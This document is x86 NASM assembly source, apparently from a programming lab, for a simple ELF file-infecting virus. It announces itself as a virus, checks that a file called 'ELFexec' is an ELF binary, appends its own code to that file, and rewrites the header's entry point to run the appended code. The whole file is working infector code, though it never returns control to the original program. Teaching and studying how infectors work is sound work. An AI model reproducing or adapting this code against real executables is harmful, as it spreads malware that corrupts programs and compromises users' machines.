%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

	global _start

	section .text

_start:
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here

	call    get_my_loc
	sub ecx,next_i-OutStr
	write 1,ecx,17 ;print This is a virus to stdout
	open FileName,RDWR,0
	mov [ebp-200],eax   ;fd
	cmp dword eax,0
	jl VirusExit
	mov ebx,ebp
	sub ebx,196
	read eax,ebx,4
	cmp byte [ebp-196], 0x7f
	jne ErrorExit
	cmp byte [ebp-196+1], 'E'
	jne ErrorExit
	cmp byte [ebp-196+2], 'L'
	jne ErrorExit
	cmp byte [ebp-196+3], 'F'
	jne ErrorExit
	lseek [ebp-200],0,SEEK_END
	mov [ebp-4],eax		;file size
	write [ebp-200],_start,virus_end-_start
	lseek [ebp-200],0,SEEK_SET
	mov ebx, ebp
	sub ebx,192
	read [ebp-200],ebx,52
	mov ecx,[ebp-4]
	add ecx,0x08048000
	mov [ebp-192+0x18],ecx
	lseek [ebp-200],0,SEEK_SET
	mov ebx,ebp
	sub ebx,192
	write [ebp-200],ebx,52
	close [ebp-200]


VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

ErrorExit:
			exit 1 ; exit if there is an error

get_my_loc:
			call next_i
next_i:
			pop ecx
			ret

FileName:	db "ELFexec", 0
OutStr:		db "This is a virus", 10, 0
Failstr:        db "perhaps not", 10 , 0

PreviousEntryPoint: dd VirusExit
virus_end:
